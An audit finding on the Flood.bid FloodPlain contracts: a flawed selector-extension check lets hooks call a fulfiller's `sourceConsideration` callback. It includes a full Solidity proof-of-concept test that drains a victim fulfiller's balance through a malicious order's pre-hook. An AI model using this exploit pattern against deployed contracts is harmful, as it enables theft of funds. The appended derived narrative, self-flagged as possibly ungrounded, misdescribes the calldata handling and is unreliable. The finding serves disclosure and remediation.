---
id: 2465
severity: "High"
---

# `FloodPlain` selector extension does not prevent `IFulfiller::sourceConsideration` callback from being called within pre/post hooks

## Description

```solidity
    bytes28 constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));

    library Hooks {
        function execute(IFloodPlain.Hook calldata hook, bytes32 orderHash, address permit2) internal {
            address target = hook.target;
            bytes calldata data = hook.data;

            bytes28 extension; // @audit - an attacker can control this value to pass the below check
            assembly ("memory-safe") {
                extension := shl(32, calldataload(data.offset)) // @audit - this shifts off the first 4 bytes of the calldata, which is the `sourceConsideration()` function selector. thus preventing a call to either `sourceConsideration()` or `sourceConsiderations()` relies on the fulfiller requiring the `selectorExtension` argument to be `SELECTOR_EXTENSION`
            }
            require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");

            assembly ("memory-safe") {
                let fmp := mload(0x40)
                calldatacopy(fmp, data.offset, data.length)
                mstore(add(fmp, data.length), orderHash)
                if iszero(call(gas(), target, 0, fmp, add(data.length, 32), 0, 0)) {
                    returndatacopy(0, 0, returndatasize())
                    revert(0, returndatasize())
                }
            }
        }
        ...
    }
```
However, the `SELECTOR_EXTENSION` constant simply acts as a sort of "magic value" as it does not actually contain the hashed function signature. As such, assuming fulfillers validate selector extension argument against this expected value, this only prevent calls using the `IFulfiller::sourceConsiderations` interface and not `IFulfiller.sourceConsideration`. Therefore, a malicious Flood order can be fulfilled and used to target a victim fulfiller by executing the arbitrary external call during the pre/post hooks. If the caller is not explicitly validated, then it is possible that this call will be accepted by the fulfiller and potentially result in dangling approvals that can be later exploited. Additionally, this same selector extension is passed to the `IFulfiller::sourceConsideration` callback in both overloaded versions of `FloodPlain::fulfillOrder` when this should ostensibly be `bytes28(keccak256("IFulfiller.sourceConsideration"))`.

While the code is not currently public, this is the case for the Bunni rebalancer that simply only checks that `msg.sender` is the Flood contract and ignores the`selectorExtension` and `caller` parameters. As a result, it can be tricked into decoding an attacker-controlled address to which an infinite approval is made for the offer token. The malicious Flood order can freely control both the Flood order and accompanying context, meaning that they can drain any token inventory held by the rebalancer.

Malicious Flood orders can spoof the `FloodPlain` address by invoking the `IFulfiller::sourceConsideration` callback during execution of the pre/post hooks.

## Proof of Concept

The following test can be added to the Flood.bid library tests in `Hooks.t.sol`:
```solidity
function test_RevertWhenSelectorExtensionClashSourceConsideration(
        bytes4 data0,
        bytes calldata data2,
        bytes32 orderHash,
        address permit2
    ) public {
        vm.assume(permit2 != hooked);
        bytes28 data1 = bytes28(keccak256("IFulfiller.sourceConsideration")); // note the absence of the final 's'
        bytes memory data = abi.encodePacked(data0, data1, data2);

        // this actually succeeds, so it is possible to call sourceConsideration on the fulfiller from the hook
        // with FloodPlain as the sender and any arbitrary caller before the consideration is actually sourced
        // which can be used to steal approvals from other contracts that integrate with FloodPlain
        hookHelper.execute(IFloodPlain.Hook({target: address(0x6969696969), data: data}), orderHash, permit2);
    }
```
And the standalone test file below demonstrates the full end-to-end issue:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "test/utils/FloodPlainTestShared.sol";

import {PermitHash} from "permit2/src/libraries/PermitHash.sol";
import {OrderHash} from "src/libraries/OrderHash.sol";

import {IFloodPlain} from "src/interfaces/IFloodPlain.sol";
import {IFulfiller} from "src/interfaces/IFulfiller.sol";
import {SELECTOR_EXTENSION} from "src/libraries/Hooks.sol";

import {IERC20, SafeERC20} from "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {Address} from "@openzeppelin/utils/Address.sol";

contract ThirdPartyFulfiller is IFulfiller {
    using SafeERC20 for IERC20;
    using Address for address payable;

    function sourceConsideration(
        bytes28 selectorExtension,
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256) {
        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")));

        IFloodPlain.Item calldata item = order.consideration;
        if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
        else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);

        return item.amount;
    }

    function sourceConsiderations(
        bytes28 selectorExtension,
        IFloodPlain.Order[] calldata orders,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256[] memory amounts) {
        require(selectorExtension == SELECTOR_EXTENSION);

        uint256[] memory amounts = new uint256[](orders.length);

        for (uint256 i; i < orders.length; ++i) {
            IFloodPlain.Order calldata order = orders[i];
            IFloodPlain.Item calldata item = order.consideration;
            amounts[i] = item.amount;
            if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
            else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
        }
    }
}

contract FloodPlainPoC is FloodPlainTestShared {
    IFulfiller victimFulfiller;

    function setUp() public override {
        super.setUp();
        victimFulfiller = new ThirdPartyFulfiller();
    }

    function test_FraudulentPreHookSourceConsideration() public {
        // create a malicious order that will call out to a third-party fulfiller in the pre hook
        // just copied the setup_mostBasicOrder logic for simplicity but this can be a fake order with fake tokens
        // since it is only the pre hook execution that is interesting here

        deal(address(token0), account0.addr, token0.balanceOf(account0.addr) + 500);
        deal(address(token1), address(fulfiller), token1.balanceOf(address(fulfiller)) + 500);
        IFloodPlain.Item[] memory offer = new IFloodPlain.Item[](1);
        offer[0].token = address(token0);
        offer[0].amount = 500;
        uint256 existingAllowance = token0.allowance(account0.addr, address(permit2));
        vm.prank(account0.addr);
        token0.approve(address(permit2), existingAllowance + 500);
        IFloodPlain.Item memory consideration;
        consideration.token = address(token1);
        consideration.amount = 500;

        // fund the victim fulfiller with native tokens that we will have it transfer out as the "consideration"
        uint256 targetAmount = 10 ether;
        deal(address(victimFulfiller), targetAmount);
        assertEq(address(victimFulfiller).balance, targetAmount);

        IFloodPlain.Item memory evilConsideration;
        evilConsideration.token = address(0);
        evilConsideration.amount = targetAmount;

        // now set up the spoofed sourceConsideration call (note the offer doesn't matter as this is not a legitimate order)
        IFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);
        IFloodPlain.Order memory maliciousOrder = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: evilConsideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: new IFloodPlain.Hook[](0),
            postHooks: new IFloodPlain.Hook[](0)
        });
        preHooks[0] = IFloodPlain.Hook({
            target: address(victimFulfiller),
            data: abi.encodeWithSelector(IFulfiller.sourceConsideration.selector, bytes28(keccak256("IFulfiller.sourceConsideration")), maliciousOrder, address(0), bytes(""))
        });

        // Construct the fraudulent order.
        IFloodPlain.Order memory order = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: consideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: preHooks,
            postHooks: new IFloodPlain.Hook[](0)
        });

        // Sign the order.
        bytes memory sig = getSignature(order, account0);

        IFloodPlain.SignedOrder memory signedOrder = IFloodPlain.SignedOrder({order: order, signature: sig});

        deal(address(token1), address(this), 500);
        token1.approve(address(book), 500);

        // Filling order succeeds and pre hook call invoked sourceConsideration on the vitim fulfiller.
        book.fulfillOrder(signedOrder);
        assertEq(address(victimFulfiller).balance, 0);
    }
}
```

## Recommendation

Following the [recent acquisition](https://0x.org/post/0x-acquires-flood-to-optimize-trade-execution) of Flood.bid by 0x, it appears that these contracts are no longer maintained. Therefore, without requiring an upstream change, this issue can be mitigated by always validating the `selectorExtension` argument is equal to the `SELECTOR_EXTENSION` constant in the implementation of both `IFulfiller::sourceConsideration` and `IFulfiller::sourceConsiderations`.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from an incorrect validation of a selector‑extension value that is intended to protect the IFulfiller.sourceConsideration callback when FloodPlain hooks execute. The contract stores a constant called SELECTOR_EXTENSION, which is derived from the hash of the IFulfiller.sourceConsiderations interface (note the trailing "s"). During hook execution the library extracts the first four bytes of the calldata, shifts them, and then checks that the extracted extension does not equal SELECTOR_EXTENSION. Because the constant represents the wrong function signature, the check only blocks calls that use the sourceConsiderations selector, while calls that use the singular sourceConsideration selector pass the test. An attacker can therefore craft a malicious Flood order that includes a pre‑hook (or post‑hook) targeting a victim fulfiller contract. The hook data encodes a call to IFulfiller.sourceConsideration with a selectorExtension that matches the expected value for that function (bytes28(keccak256("IFulfiller.sourceConsideration"))). Since the library’s require statement does not reject this value, the external call is performed with the FloodPlain contract as msg.sender. If the victim fulfiller trusts the FloodPlain address and does not further validate the caller or the selectorExtension, it will execute its sourceConsideration logic, which typically grants an allowance or transfers tokens to the caller. Consequently the attacker can obtain an infinite ERC‑20 allowance or drain native balances from the victim contract, effectively stealing any token inventory held by the fulfiller. The issue manifests whenever a contract integrates FloodPlain and implements the sourceConsideration callback without strict selectorExtension verification, as demonstrated by the Bunni rebalancer that only checks msg.sender. From a user’s perspective the symptoms are missing funds: a contract that previously held tokens suddenly shows a zero balance, or an expected refund never arrives. The bug is subtle because the constant appears to be a “magic” value and the assembly‑based extraction of the selectorExtension is not obvious in a code review, making the flaw easy to overlook. The problem was discovered during a security audit by Cyfrin, which reproduced the exploit with a PoC that creates a malicious order, injects a pre‑hook calling sourceConsideration on a victim fulfiller, and verifies that the victim’s balance is drained after order fulfillment. To remediate the issue, the implementation of both IFulfiller.sourceConsideration and IFulfiller.sourceConsiderations should explicitly compare the received selectorExtension against the correct constant for each function (i.e., bytes28(keccak256("IFulfiller.sourceConsideration")) for the singular version) and optionally enforce that the caller is an authorized address. This change prevents arbitrary external calls from being injected via hooks and restores the intended accounting guarantees of the protocol.
